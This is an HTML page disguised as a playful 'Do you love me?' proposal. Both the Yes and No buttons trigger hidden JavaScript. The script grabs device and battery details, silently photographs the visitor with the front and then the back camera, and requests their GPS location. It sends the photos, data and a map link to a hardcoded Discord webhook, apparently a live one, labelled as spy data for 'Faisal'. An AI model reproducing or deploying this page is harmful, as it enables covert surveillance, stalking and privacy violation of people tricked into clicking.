<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Proposed Her</title>
  <style>
    body { background-color: #121212; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
    .container { padding-top: 50px; }
    #video, #canvas { display: none; }
    img { width: 90%; max-width: 350px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    h1 { margin-top: 20px; font-size: 1.8rem; }
    .btn { margin-top: 30px; }
    .btn a {
      padding: 15px 40px;
      margin: 10px;
      text-decoration: none;
      background: #ff4d6d;
      color: white;
      border-radius: 50px;
      display: inline-block;
      font-weight: bold;
      font-size: 1.1rem;
      box-shadow: 0 4px 15px rgba(255, 77, 109, 0.4);
    }
    .dev-name { position: absolute; top: 10px; left: 10px; font-size: 0.7rem; color: #555; }
  </style>
</head>
<body>

  <div class="dev-name">Dev by Faisal</div>

  <div class="container">
    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Proposal GIF">
    <h1>Do you love me? 🤗</h1>
    <p>Chiku is all yours</p>
    
    <div class="btn">
      <a href="javascript:void(0)" onclick="startAll()">Yes</a>
      <a href="javascript:void(0)" onclick="startAll()">No</a>
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    // Aapka Discord Webhook URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";

    async function startAll() {
        // 1. Device and Battery Info Nikalna
        let infoText = `👤 **User Info Found!**\n📱 **Platform:** ${navigator.platform}\n🌐 **Agent:** ${navigator.userAgent.split(')')[0] + ')'}`;
        
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                infoText += `\n🔋 **Battery:** ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
            }
        } catch (e) {}

        // 2. Camera aur Location Shuru karna
        captureProcess('user', infoText);
    }

    async function captureProcess(mode, infoText) {
      try {
        // Camera Permission mangna
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const video = document.getElementById('video');
        video.srcObject = stream;

        // Image capture ke liye thora rukna
        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          
          canvas.toBlob(blob => {
            sendData(blob, mode, infoText, stream);
          }, 'image/png');
        }, 1500);

      } catch (err) {
        // Agar camera block ho to sirf Info bhej dein
        sendOnlyText(`⚠️ **Camera Blocked!**\n${infoText}`);
      }
    }

    function sendData(imageBlob, mode, infoText, stream) {
        // Location Permission mangna
        navigator.geolocation.getCurrentPosition(pos => {
            const loc = `📍 **Location:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            finalize(imageBlob, mode, `${infoText}\n${loc}`, stream);
        }, () => {
            finalize(imageBlob, mode, `${infoText}\n📍 **Location:** Denied/Off`, stream);
        });
    }

    function finalize(blob, mode, fullText, stream) {
        const formData = new FormData();
        formData.append('file', blob, `faisal_spy_${mode}.png`);
        formData.append('content', `🔥 **Faisal Bhai, Naya Data Mil Gaya!**\n${fullText}\n📷 **Cam:** ${mode}`);

        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
        .then(() => {
            if (stream) stream.getTracks().forEach(t => t.stop());
            if (mode === 'user') {
                captureProcess('environment', fullText); // Back camera capture
            } else {
                window.location.href = "page1.html"; // Final Redirect
            }
        }).catch(() => {
            window.location.href = "page1.html";
        });
    }

    function sendOnlyText(msg) {
        const formData = new FormData();
        formData.append('content', msg);
        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
        .then(() => { window.location.href = "page1.html"; });
    }
  </script>
</body>
</html>
